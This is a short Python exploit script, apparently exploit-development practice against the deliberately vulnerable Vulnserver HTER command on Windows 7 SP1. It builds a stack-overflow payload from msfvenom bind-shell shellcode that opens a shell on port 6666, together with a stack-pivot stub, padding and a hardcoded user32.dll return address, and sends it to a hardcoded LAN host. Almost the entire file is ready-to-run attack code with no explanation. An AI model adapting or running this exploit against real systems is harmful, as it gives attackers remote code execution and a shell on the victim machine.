#!/usr/bin/python 
# Vulnserver HTER command stack overflow exploit for Windows 7 SP1 
import socket
import sys 
host = '192.168.1.104'
port = 666
fixesp = "505c90909090909090909090" # PUSH EAX POP ESP + NOPS
# msfvenom -p windows/shell_bind_tcp LPORT=6666 -b "\x00\xcc" -a x86 -f hex
shell = "dac9d97424f45a31c9bdb63ab8d4b15383eafc316a1303dc295a21dca618ca1c377d42f906bd308a390d32deb5e616ca4e8abefde7219930f71ad9537b610eb342aa43b283d7aee65c931d16e8e99d9da2fca54272fe84d5085907d4ddd10ece02dfd965f0abdbafc854778ee4a689d7c358fc2130e407f64a328decedb135c80c15a39b03d2a7c307e56478336e8baeb534a86a9defd12b7b41ed2b243e4b20c92be66b8698cb9356b75ce06418f76ec5d1d1692ac8a6e5d5f3d62c12a78646b3c84c963c1df89e9bce1f635bbf9fcb34d52f3424d6e55dcd2b067b04a5e01108e3bb8dead0732a14332cdc5d55ebe35d735b73d6905f62e9bcf7f37e4a96b61f4bb32083de58b0cac2f6e79b350f6d366fb993cbe9821710ca0d96d5762a88237676fcfb2120aabd9b820414774dc0e1bb4e96ed9138765f4c7d89501889f28cb8762915c83c733c4199e67c0c1add432999d73bce81923e8a054f3383e36fe0a421"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
payload =  "HTER 1" # The First character always gets removed 
payload += fixesp
payload += shell  
payload += "A" * (2032 -len(shell)-len(fixesp))
payload += "B" * 8   # This is EBP
payload += "2965ea77" # JMP EAX in user32.dll (Windows 7 SP1) 
payload += "D" * 1951
s.connect((host,port))
print("Sending Ev1l payload.....") 
s.send(payload)
print(payload) 
s.close() 


